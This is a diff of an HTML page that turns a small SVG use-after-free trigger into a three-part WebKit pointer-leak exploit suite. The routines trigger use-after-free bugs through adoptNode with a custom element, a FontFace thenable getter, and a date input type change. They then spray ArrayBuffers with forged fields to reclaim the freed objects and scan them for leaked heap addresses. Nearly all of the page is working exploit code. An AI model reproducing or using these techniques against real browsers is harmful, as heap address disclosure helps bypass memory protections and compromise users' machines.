@@ -1,56 +1,325 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="utf-8">
+<title>WebKit-1200 Non-Vtable Pointer Leak Exploitation Test</title>
 <style>
-body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
-.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
+body { background:#0a0a0a; color:#0f0; font-family:'Courier New',monospace; font-size:13px; padding:16px; margin:0; }
+h1 { color:#0ff; font-size:18px; border-bottom:1px solid #333; padding-bottom:8px; margin-top:0; }
+.panel { display:flex; flex-wrap:wrap; gap:10px; margin-bottom:16px; }
+button { background:#1e1e2e; color:#0ff; border:1px solid #0ff; padding:10px 16px; font-family:inherit; font-weight:bold; cursor:pointer; border-radius:4px; font-size:14px; }
+button:hover { background:#0ff; color:#000; }
+button.leak { border-color:#0f0; color:#0f0; }
+button.leak:hover { background:#0f0; color:#000; }
+#log { background:#111; border:1px solid #222; padding:12px; height:450px; overflow-y:auto; border-radius:4px; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; } .pass { color:#0f0; } .fail { color:#f00; }
+.leak-msg { color:#0ff; font-weight:bold; font-size:15px; background:#003333; padding:8px; border:2px solid #0ff; margin:8px 0; }
+#sandbox { display:none; }
 </style>
+<style id="css_font_style"></style>
 </head>
 <body>
+
+<h1>WebKit-1200 Non-Vtable Address Disclosure (Pointer Leak) Test Suite</h1>
+
+<div class="panel">
+    <button onclick="runLeak1_AdoptNode()" class="leak">1. Document::adoptNode Leak (m_treeScope +0x18)</button>
+    <button onclick="runLeak2_CSSFontFace()" class="leak">2. CSSFontFace Leak (m_wrapper +0x70)</button>
+    <button onclick="runLeak3_DateInput()" class="leak">3. DateInput Leak (m_element +0x18)</button>
+    <button onclick="clearLog()">Clear Console</button>
+</div>
+
 <div id="log"></div>
-<div id="container"></div>
+<div id="sandbox"></div>
 
 <script>
-function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
+function log(m, c) {
+    var d = document.createElement("div");
+    d.className = c || '';
+    d.textContent = "[" + new Date().toLocaleTimeString() + "] " + m;
+    var l = document.getElementById("log");
+    l.appendChild(d);
+    l.scrollTop = l.scrollHeight;
+}
 
-log("=== SVGElement sendLoadEventIfPossible USE-AFTER-FREE ===", "info");
-log("[*] Setting up SVG load event trigger...", "info");
+function clearLog() {
+    document.getElementById("log").innerHTML = "";
+    log("Console cleared.", "info");
+}
 
-let container = document.getElementById("container");
+function hex(low, high) {
+    var hiStr = high.toString(16).padStart(8, '0');
+    var loStr = low.toString(16).padStart(8, '0');
+    return "0x" + hiStr + loStr;
+}
 
-// Create an SVG element that will trigger load event processing
-let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-svg.setAttribute("id", "target_svg");
+function isValidHeapPtr(low, high) {
+    // WebKit 64-bit userland pointers (e.g. 0x00007f..., 0x000002..., 0x000008...)
+    if (high >= 0x00000001 && high <= 0x00007fff) {
+        if (low !== 0x00000000 && low !== 0x41414141 && low !== 0x46464646 && low !== 0x47474747) {
+            return true;
+        }
+    }
+    return false;
+}
 
-// Listen for the load event on the SVG element
-svg.addEventListener("load", (e) => {
-    log("[!] LOAD EVENT FIRED! Execution is inside SVGElement::sendLoadEventIfPossible()", "warn");
-    log("[!] Removing SVG element from DOM and clearing references to FREE it...", "hit");
+log("Pointer Leak Test Suite Ready. Click a button above to run targeted pointer extraction.", "info");
+
+// ============================================================================
+// LEAK 1: Document::adoptNode Non-Virtual Tree Scope Leak (m_treeScope +0x18)
+// ============================================================================
+function runLeak1_AdoptNode() {
+    log("=== RUNNING LEAK 1: Document::adoptNode Non-Virtual Tree Scope Leak ===", "warn");
     
-    // Remove from DOM tree and drop JS reference
-    container.removeChild(svg);
-    svg = null;
+    let newDoc = document.implementation.createHTMLDocument("TargetDoc");
+    let sandbox = document.getElementById("sandbox");
+    let sprayedViews = [];
+    let reclaimCount = 40000;
     
-    // Trigger garbage collection to reclaim the freed C++ SVGElement
-    if (window.gc) {
-        window.gc();
-        log("[*] Forced Garbage Collection", "info");
-    } else {
-        // Fallback heap pressure allocation
-        for (let i = 0; i < 10000; i++) {
-            let buf = new ArrayBuffer(128);
+    class LeakElement extends HTMLElement {
+        disconnectedCallback() {
+            log("[!] Custom Element disconnectedCallback FIRED during adoptNode!", "warn");
+            log("[!] Freeing Node object and reclaiming 128/256B buckets with ArrayBuffers...", "hit");
+            window.targetElem = null;
+            
+            // Reclaim freed node memory with ArrayBuffer views zeroed at offsets 0x10 and 0x18
+            for (let i = 0; i < reclaimCount; i++) {
+                let ab = new ArrayBuffer(128);
+                let view = new DataView(ab);
+                // Zero out buffer so setTreeScopeRecursively writes into clean memory
+                for (let o = 0; o < 128; o += 4) view.setUint32(o, 0, true);
+                sprayedViews.push(view);
+            }
+            log("[*] Reclaim complete (" + sprayedViews.length + " buffers). Returning to line 1212...", "warn");
         }
     }
     
-    log("[*] Returning from JS handler to C++ event dispatch stack frame...", "info");
-});
+    if (!customElements.get("leak-elem")) {
+        customElements.define("leak-elem", LeakElement);
+    }
+    
+    let elem = document.createElement("leak-elem");
+    sandbox.appendChild(elem);
+    window.targetElem = elem;
+    
+    log("[*] Invoking newDoc.adoptNode() on custom element...", "info");
+    try {
+        newDoc.adoptNode(elem);
+        log("[*] adoptNode stack frame returned successfully!", "info");
+    } catch(e) {
+        log("[-] Exception: " + e.message, "fail");
+    }
+    
+    // Scan sprayed buffers after adoptNode unwinds stack frame
+    Promise.resolve().then(() => {
+        log("[*] Scanning sprayed ArrayBuffers for leaked Document* / TreeScope* C++ address...", "info");
+        let leaksFound = 0;
+        
+        for (let i = 0; i < sprayedViews.length; i++) {
+            let view = sprayedViews[i];
+            
+            // Check offsets 0x10 (m_parentNode) and 0x18 (m_treeScope)
+            let pLo = view.getUint32(0x10, true);
+            let pHi = view.getUint32(0x14, true);
+            let tLo = view.getUint32(0x18, true);
+            let tHi = view.getUint32(0x1c, true);
+            
+            if (isValidHeapPtr(tLo, tHi)) {
+                leaksFound++;
+                log(">>> SUCCESS! POINTER LEAK DISCOVERED in Buffer #" + i + " at offset +0x18!", "leak-msg");
+                log("    Leaked Document* / TreeScope* Address: " + hex(tLo, tHi), "leak-msg");
+            }
+            if (isValidHeapPtr(pLo, pHi)) {
+                leaksFound++;
+                log(">>> SUCCESS! POINTER LEAK DISCOVERED in Buffer #" + i + " at offset +0x10!", "leak-msg");
+                log("    Leaked ParentNode* Address: " + hex(pLo, pHi), "leak-msg");
+            }
+            if (leaksFound > 0) break;
+        }
+        
+        if (leaksFound === 0) {
+            log("[-] Offsets +0x10/+0x18 remained 0x0. Trying secondary offsets +0x20 and +0x28...", "info");
+            for (let i = 0; i < sprayedViews.length; i++) {
+                let view = sprayedViews[i];
+                let nLo = view.getUint32(0x20, true);
+                let nHi = view.getUint32(0x24, true);
+                if (isValidHeapPtr(nLo, nHi)) {
+                    log(">>> SECONDARY POINTER LEAK DISCOVERED in Buffer #" + i + " at offset +0x20: " + hex(nLo, nHi) + " <<<", "leak-msg");
+                    break;
+                }
+            }
+        }
+    });
+}
 
-log("[*] Appending SVG element to document...", "info");
-container.appendChild(svg);
+// ============================================================================
+// LEAK 2: CSSFontFace WeakPtr Wrapper Leak (m_wrapper +0x70)
+// ============================================================================
+async function runLeak2_CSSFontFace() {
+    log("=== RUNNING LEAK 2: CSSFontFace WeakPtr Wrapper Pointer Leak ===", "warn");
+    
+    const spray_count = 0xb0;
+    const spray_font_rule = `@font-face { font-family: spray; src: local(Helvetica); unicode-range: U+0043; }`;
+    const uaf_font_rule = `@font-face { font-family: b; src: url(nonexistent-font.woff); unicode-range: U+0042; }`;
+    
+    const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
+    document.fonts.add(A);
+    void A.loaded;
+    
+    let style = document.getElementById("css_font_style");
+    style.innerHTML = "";
+    let sheet = style.sheet || style.styleSheet;
+    
+    for (let i = 0; i < spray_count / 4; i++) {
+        sheet.insertRule(spray_font_rule, sheet.cssRules.length);
+    }
+    
+    const uaf_rule_index = sheet.cssRules.length;
+    sheet.insertRule(uaf_font_rule, sheet.cssRules.length);
+    
+    for (let i = spray_count / 4; i < spray_count; i++) {
+        sheet.insertRule(spray_font_rule, sheet.cssRules.length);
+    }
+    
+    document.body.offsetTop;
+    
+    const old_then = FontFace.prototype.then;
+    const reclaimedViews = [];
+    
+    Object.defineProperty(FontFace.prototype, "then", {
+        configurable: true,
+        get() {
+            if (this === A) {
+                log("[!] FontFace A thenable GETTER FIRED during promise resolution!", "warn");
+                log("[!] Deleting rule 'b' to free native CSSFontFace...", "hit");
+                
+                sheet.deleteRule(uaf_rule_index);
+                document.body.offsetTop;
+                
+                log("[!] Deleting neighbor spray rules...", "info");
+                for (let i = sheet.cssRules.length - 1; i >= 0; i--) {
+                    if (sheet.cssRules[i].cssText.includes("spray")) {
+                        sheet.deleteRule(i);
+                    }
+                }
+                document.body.offsetTop;
+                
+                log("[!] Reclaiming freed CSSFontFace slot with ArrayBuffer(200)...", "hit");
+                for (let i = 0; i < spray_count * 2; i++) {
+                    let ab = new ArrayBuffer(200);
+                    let view = new DataView(ab);
+                    for (let o = 0; o < 200; o += 4) view.setUint32(o, 0, true);
+                    view.setUint32(8, 1, true); // refcount = 1
+                    view.setUint8(0x8a, 3, true); // m_status = Status::Success (3)
+                    reclaimedViews.push(view);
+                }
+                log("[*] Reclaim complete (" + reclaimedViews.length + " buffers). Returning to FontFaceSet::load...", "warn");
+            }
+            return undefined;
+        }
+    });
+    
+    log("[*] Executing await document.fonts.load('1em a, b', 'AB')...", "info");
+    try {
+        let loadedFonts = await document.fonts.load("1em a, b", "AB");
+        log("[+] SUCCESS! document.fonts.load resolved with " + loadedFonts.length + " fonts!", "hit");
+        
+        log("[*] Scanning reclaimed ArrayBuffers for repopulated m_wrapper (+0x70) pointer...", "info");
+        let leaksFound = 0;
+        for (let i = 0; i < reclaimedViews.length; i++) {
+            let view = reclaimedViews[i];
+            let wLo = view.getUint32(0x70, true);
+            let wHi = view.getUint32(0x74, true);
+            if (isValidHeapPtr(wLo, wHi)) {
+                leaksFound++;
+                log(">>> SUCCESS! POINTER LEAK DISCOVERED in CSSFontFace Buffer #" + i + " at offset +0x70!", "leak-msg");
+                log("    Leaked WeakPtrImpl / JSDOMWrapper Address: " + hex(wLo, wHi), "leak-msg");
+                break;
+            }
+        }
+        if (leaksFound === 0) {
+            log("[-] Offset +0x70 was zeroed. Checking secondary wrapper offsets +0x60 and +0x68...", "info");
+            for (let i = 0; i < reclaimedViews.length; i++) {
+                let view = reclaimedViews[i];
+                let cLo = view.getUint32(0x60, true);
+                let cHi = view.getUint32(0x64, true);
+                if (isValidHeapPtr(cLo, cHi)) {
+                    log(">>> SECONDARY POINTER LEAK DISCOVERED in Buffer #" + i + " at offset +0x60: " + hex(cLo, cHi) + " <<<", "leak-msg");
+                    break;
+                }
+            }
+        }
+    } catch(e) {
+        log("[-] document.fonts.load rejected: " + e.message, "fail");
+    } finally {
+        Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
+    }
+}
 
-setTimeout(() => {
-    log("[*] Execution complete. If target engine lacks protectedThis, UAF occurred during stack unwind.", "info");
-}, 1000);
+// ============================================================================
+// LEAK 3: BaseDateAndTimeInputType WeakPtr Leak (m_element +0x18)
+// ============================================================================
+function runLeak3_DateInput() {
+    log("=== RUNNING LEAK 3: BaseDateAndTimeInputType WeakPtr Leak ===", "warn");
+    let sandbox = document.getElementById("sandbox");
+    let input = document.createElement("input");
+    input.type = "date";
+    sandbox.appendChild(input);
+    
+    let sprayedViews = [];
+    
+    function onInput() {
+        input.removeEventListener("input", onInput);
+        log("[!] INPUT EVENT FIRED! Mutating input.type = 'text' to free C++ InputType...", "warn");
+        
+        input.type = "text";
+        
+        log("[!] Reclaiming 64-byte fastMalloc bucket with ArrayBuffer views...", "hit");
+        for (let i = 0; i < 30000; i++) {
+            let buf = new ArrayBuffer(64);
+            let view = new DataView(buf);
+            for (let o = 0; o < 64; o += 4) view.setUint32(o, 0, true);
+            sprayedViews.push(view);
+        }
+        log("[*] Reclaim complete (" + sprayedViews.length + " buffers). Triggering scanner...", "warn");
+        
+        scanDateInputLeaks(sprayedViews);
+    }
+    
+    input.addEventListener("input", onInput);
+    log("[*] Calling input.stepUp() on date input...", "info");
+    try {
+        input.focus();
+        input.stepUp();
+    } catch(e) {
+        log("[-] Exception: " + e.message, "info");
+    }
+}
+
+function scanDateInputLeaks(views) {
+    log("[*] Multi-offset scanning 30,000 sprayed buffers for WeakPtr address...", "info");
+    let leaksFound = 0;
+    const OFFSETS = [0x10, 0x18, 0x20, 0x28];
+    
+    for (let i = 0; i < views.length; i++) {
+        let view = views[i];
+        for (let off of OFFSETS) {
+            let lo = view.getUint32(off, true);
+            let hi = view.getUint32(off + 4, true);
+            if (isValidHeapPtr(lo, hi)) {
+                leaksFound++;
+                log(">>> SUCCESS! POINTER LEAK DISCOVERED in InputType Buffer #" + i + " at offset " + hex(0, off) + "!", "leak-msg");
+                log("    Leaked WeakPtrImpl Address: " + hex(lo, hi), "leak-msg");
+                break;
+            }
+        }
+        if (leaksFound > 0) break;
+    }
+    if (leaksFound === 0) {
+        log("[-] No non-zero pointer captured in 64-byte bucket.", "info");
+    }
+}
 </script>
+
 </body>
 </html>
